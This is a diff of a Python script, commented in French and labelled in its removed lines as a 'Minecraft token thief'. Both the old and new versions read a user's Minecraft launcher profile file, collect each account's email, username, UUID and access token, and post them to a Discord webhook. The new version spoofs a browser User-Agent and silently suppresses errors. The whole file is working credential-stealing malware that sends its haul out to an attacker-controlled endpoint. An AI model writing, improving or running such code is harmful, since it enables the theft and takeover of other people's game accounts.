@@ -1,71 +1,49 @@
+import json
+import os
 from urllib.request import Request, urlopen
 
-import json
+# Votre URL de webhook
+WEBHOOK_URL = "WEBHOOK HERE"
 
-import os
-
-
-
-# configuration
-
-WEBHOOK_URL = '<URL ICI>'
-
-
+# vous metionne (notification)
+PING_ME = False
 
 def uuid_dashed(uuid):
+    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
 
-    return f'{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}'
+def main():
+    auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]
 
+    embeds = []
 
+    for x in auth_db:
+        try:
+            email = auth_db[x].get("username")
+            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
+            embed = {
+                "fields": [
+                    {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
+                    {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
+                    {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
+                    {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
+                ]
+            }
+            embeds.append(embed)
+        except:
+            pass
 
-if __name__ == '__main__':
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
 
-    auth_db = json.loads(open(os.getenv('APPDATA') + '\\.minecraft\\launcher_profiles.json').read())['authenticationDatabase']
-
-
-
-    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft VOLEUR DE Token ', avatar_url='http://www.rw-designer.com/icon-image/5547-256x256x32.png')
-
+    payload = json.dumps({"embeds": embeds, "content": "@everyone" if PING_ME else ""})
     
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
 
-    for i, x in enumerate(auth_db):
-
-        token = auth_db[x]['token']
-
-        email = auth_db[x].get('name')
-
-        uuid, display_name_object = list(auth_db[x]['profiles'].items())[0]
-
-
-
-        embed = discord_webhook.DiscordEmbed(color=0xFEFEFE)
-
-        
-
-        if i == 0:
-
-            embed.set_author(name='Aller sur discord XD', url='https://discord.com', icon_url='https://github.com/fluidicon.png')
-
-        elif i == len(auth_db) - 1:
-
-            embed.set_footer(text='Developed by ALEXDIEU')
-
-
-
-        embed.add_embed_field(name='Email', value=email if email and '@' in email else 'N/A', inline=False)
-
-
-
-        embed.add_embed_field(name='NOM', value=display_name_object['displayname'])
-
-        embed.add_embed_field(name='UUID', value=uuid_dashed(uuid))
-
-        embed.add_embed_field(name='Son Token', value=token)
-
-
-
-        webhook.add_embed(embed)
-
-
-
-    webhook.execute()
+if __name__ == "__main__":
+    main()
